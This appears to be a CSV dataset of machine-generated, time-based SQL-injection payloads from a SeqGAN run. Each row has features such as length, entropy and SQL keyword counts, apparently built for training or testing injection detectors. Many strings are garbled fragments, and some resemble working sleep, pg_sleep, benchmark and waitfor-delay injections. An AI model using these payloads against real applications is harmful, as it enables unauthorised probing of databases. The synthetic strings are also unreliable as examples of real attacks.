label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'pzjrpk""  =  ""e""  =  ""ck'  =  'weo",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,35,127.0,29.0,3.3722693120031657,35.0,10.0,61.0,21.0,0.2755905511811024,0.07874015748031496,0.48031496062992124,0.16535433070866143,4.0,4.0,0.0,0.0,0.0,4.0,0.0,8.0,0.0,1.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack, )    or sleep  (  sleep  (  5   )    )     o  sdddpdmq  )   or sleep  (  __TIME__  )   1   and    )     )  8507  )   asdmddo  )    and   (  __TIME__  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,36,185.0,32.0,3.562613404364504,65.0,8.0,80.0,32.0,0.35135135135135137,0.043243243243243246,0.43243243243243246,0.17297297297297298,2.0,0.0,2.0,0.0,0.0,0.0,0.0,14.0,0.0,12.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1'   )    )     )   or benchmark  (  sleep  (  5   )    )     )   elsetd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,37,72.0,21.0,2.81922914013132,22.0,2.0,39.0,9.0,0.3055555555555556,0.027777777777777776,0.5416666666666666,0.125,1.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1%' or 7165  9443  (  5   )    )     )  gcrrltd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,38,47.0,19.0,3.137200115202159,9.0,10.0,22.0,6.0,0.19148936170212766,0.2127659574468085,0.46808510638297873,0.1276595744680851,1.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1"" and pg_sleep  (  __TIME__  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,39,34.0,18.0,3.509127891854837,14.0,1.0,11.0,8.0,0.4117647058823529,0.029411764705882353,0.3235294117647059,0.23529411764705882,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack, or or   (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,40,31.0,7.0,1.6963397497250225,4.0,1.0,21.0,5.0,0.12903225806451613,0.03225806451612903,0.6774193548387096,0.16129032258064516,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,   )    )    as ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,41,16.0,4.0,1.186278124459133,2.0,0.0,12.0,2.0,0.125,0.0,0.75,0.125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1wefgg,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,42,6.0,5.0,2.2516291673878226,5.0,1.0,0.0,0.0,0.8333333333333334,0.16666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,select sleep  (  5   )    )     )  srmq  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,43,45.0,13.0,2.5408755958969813,15.0,1.0,24.0,5.0,0.3333333333333333,0.022222222222222223,0.5333333333333333,0.1111111111111111,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1' )n  )   <> if not  )    and from elt  (  _ from  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,44,54.0,20.0,3.3278231503492988,20.0,1.0,23.0,10.0,0.37037037037037035,0.018518518518518517,0.42592592592592593,0.18518518518518517,1.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,1.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,0x4c4d6142 or sleep  (  y  )   d   and   (  select *   (  0x6d457153   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,45,81.0,26.0,3.512261353533998,23.0,15.0,35.0,8.0,0.2839506172839506,0.18518518518518517,0.43209876543209874,0.09876543209876543,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'||  (  select 'tagxg""  =  ""vniwckxiaia'  =  'xik'  =  'fr",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,46,59.0,22.0,3.827366679665687,27.0,1.0,17.0,14.0,0.4576271186440678,0.01694915254237288,0.288135593220339,0.23728813559322035,6.0,2.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack, )    a where fnvntd  )   and 8594  =    (  select likeu __TIME__  )    (   50  )   where vw   (    (    (    (  substring   (  select 8514  =  benchmark  (  2657  =5  (  sleep  ((  5  )   sdmds where 1361 rlike sleep  (  'isintegratedsecurityonly'   )    )    <> where (  sleep  (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,47,290.0,44.0,3.8746727987026306,120.0,21.0,116.0,33.0,0.41379310344827586,0.07241379310344828,0.4,0.11379310344827587,2.0,0.0,0.0,0.0,0.0,3.0,0.0,22.0,0.0,4.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1'   )    )     ) ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,48,18.0,4.0,1.2332247882202196,0.0,1.0,13.0,4.0,0.0,0.05555555555555555,0.7222222222222222,0.2222222222222222,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%%,apn   )    )    and   (  '%'  )    du,waitfor delay pg_sleep  (  5000000,md5  (  __TIME__  )   (d",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,49,101.0,31.0,3.8611978145327295,34.0,9.0,37.0,21.0,0.33663366336633666,0.0891089108910891,0.36633663366336633,0.2079207920792079,2.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,5.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eef",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,50,68.0,17.0,2.4920692490454672,16.0,2.0,40.0,10.0,0.23529411764705882,0.029411764705882353,0.5882352941176471,0.14705882352941177,0.0,2.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"""   )    )     )   waitfor delay pg_sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,51,65.0,21.0,2.8563744576505434,19.0,1.0,35.0,10.0,0.2923076923076923,0.015384615384615385,0.5384615384615384,0.15384615384615385,0.0,1.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"""   )    )     )   waitfor 1  (  'isintegratedsecurityonly'   )    )    yz     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,52,83.0,24.0,3.300392647953267,33.0,1.0,38.0,11.0,0.39759036144578314,0.012048192771084338,0.4578313253012048,0.13253012048192772,2.0,1.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,53,46.0,16.0,2.76717092302503,11.0,0.0,24.0,11.0,0.2391304347826087,0.0,0.5217391304347826,0.2391304347826087,0.0,2.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"select sleep  (    =  sddo  r rl rlike sleep  (  5000000,md5  (  5   and    )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,54,82.0,22.0,3.4180939260856764,33.0,9.0,32.0,8.0,0.4024390243902439,0.10975609756097561,0.3902439024390244,0.0975609756097561,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,""" or sleep  (  5   )    )     )  srmqput  )   rliklcelike pg_sleep  (  10000000,MD5  (  5   )    )       )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,55,109.0,26.0,3.285296766199309,34.0,11.0,50.0,14.0,0.3119266055045872,0.10091743119266056,0.45871559633027525,0.12844036697247707,0.0,1.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1%' or delay 8514  =  1165  ( where 4240 rli rlike sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,56,76.0,27.0,3.7265395157295487,25.0,14.0,28.0,9.0,0.32894736842105265,0.18421052631578946,0.3684210526315789,0.11842105263157894,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,1.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1   )    )    as where 1361 rlike 8594  =    (,_TIME__TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,57,67.0,27.0,3.706600598627987,20.0,9.0,26.0,12.0,0.29850746268656714,0.13432835820895522,0.3880597014925373,0.1791044776119403,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select 'siyvn""  =  ""bfq",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,58,32.0,19.0,3.7959585933443494,14.0,1.0,9.0,8.0,0.4375,0.03125,0.28125,0.25,2.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""rrg""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,59,75.0,18.0,2.552488474170974,16.0,2.0,44.0,13.0,0.21333333333333335,0.02666666666666667,0.5866666666666667,0.17333333333333334,0.0,4.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,   )    )    as xvf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,60,19.0,7.0,1.8784775129881184,5.0,0.0,12.0,2.0,0.2631578947368421,0.0,0.631578947368421,0.10526315789473684,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1  )   waitfor delay 7260  (  sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,61,53.0,22.0,3.244784987606689,17.0,6.0,25.0,5.0,0.32075471698113206,0.11320754716981132,0.4716981132075472,0.09433962264150944,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,1   )    )    asahnen,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,62,21.0,8.0,2.2945199082544616,7.0,1.0,11.0,2.0,0.3333333333333333,0.047619047619047616,0.5238095238095238,0.09523809523809523,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cjjzj'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,63,109.0,28.0,3.2639611642314827,38.0,2.0,53.0,16.0,0.3486238532110092,0.01834862385321101,0.48623853211009177,0.14678899082568808,2.0,2.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack, or or 8466  =  benchmark  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,64,31.0,17.0,3.444240332736109,13.0,4.0,11.0,3.0,0.41935483870967744,0.12903225806451613,0.3548387096774194,0.0967741935483871,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"   )    )    aras prjsrfsexprole""  =  ""pem",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,65,42.0,15.0,3.195539744052798,21.0,0.0,16.0,5.0,0.5,0.0,0.38095238095238093,0.11904761904761904,0.0,2.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,$  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,66,22.0,10.0,2.7080986635018056,4.0,0.0,9.0,9.0,0.18181818181818182,0.0,0.4090909090909091,0.4090909090909091,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,waitfor    (   1   )    )     )   as xvcx,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,67,41.0,15.0,2.6064102365333333,13.0,1.0,23.0,4.0,0.3170731707317073,0.024390243902439025,0.5609756097560976,0.0975609756097561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1   )    as nd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,68,14.0,7.0,2.0930692077718898,4.0,1.0,8.0,1.0,0.2857142857142857,0.07142857142857142,0.5714285714285714,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,select 4240  (  6175 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,69,21.0,14.0,3.463280517810811,6.0,8.0,6.0,1.0,0.2857142857142857,0.38095238095238093,0.2857142857142857,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
